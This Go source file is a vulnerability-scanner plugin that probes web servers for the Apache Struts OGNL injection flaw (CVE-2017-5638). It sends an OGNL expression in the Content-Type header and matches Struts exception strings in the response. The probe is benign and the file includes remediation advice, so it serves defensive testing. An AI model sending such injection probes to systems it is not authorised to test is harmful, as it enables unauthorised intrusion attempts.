package plugins

import (
	"DORM/models"
	"fmt"
	"net/http"
	"strings"
)

// 76. APACHE STRUTS RCE (OGNL Injection)
type StrutsPlugin struct{}

func (p *StrutsPlugin) Name() string { return "Apache Struts RCE" }

// ognlErrorSignatures are strings a Struts backend leaks when it actually
// evaluates (or chokes on) an OGNL expression smuggled through the
// Content-Type header — proof the payload reached the OGNL parser, not just
// a generic 4xx/5xx from an unrelated cause.
var ognlErrorSignatures = []string{
	"ognl.OgnlException",
	"com.opensymphony.xwork2",
	"org.apache.struts2",
	"Unable to instantiate Action",
	"ognl.MethodFailedException",
}

func (p *StrutsPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	client := models.GetClient()
	req, _ := http.NewRequest("GET", getURL(target, "/struts2-showcase/"), nil)
	payload := "%{(#_='=').(#t=@java.lang.System@currentTimeMillis()).(#t)}"
	req.Header.Set("Content-Type", payload)
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer func() { _ = resp.Body.Close() }()

	// This previously read req.Header.Get("Content-Type") — the OGNL payload
	// we ourselves just set — which can never say anything about what the
	// server did with it. The response body is what actually proves (or
	// disproves) that the backend parsed/evaluated the expression.
	body := models.ReadBody(resp, 65536)
	for _, sig := range ognlErrorSignatures {
		if strings.Contains(body, sig) {
			return &models.Vulnerability{
				Target:   target,
				Name:     "Apache Struts OGNL Injection (RCE)",
				Severity: "CRITICAL",
				CVSS:     9.8,
				Description: fmt.Sprintf(
					"OGNL expression smuggled via the Content-Type header triggered a Struts/OGNL exception, confirming the backend parsed and evaluated attacker-controlled input.\nEndpoint: %s\nProof signature: %s\nStatus: %d",
					getURL(target, "/struts2-showcase/"), sig, resp.StatusCode,
				),
				Solution:  "Upgrade Apache Struts to the latest patched version. Never evaluate OGNL expressions built from user-controlled input (Content-Type, params, or otherwise).",
				Reference: "CVE-2017-5638 / CWE-917: Improper Neutralization of Special Elements used in an Expression Language Statement",
			}
		}
	}
	return nil
}
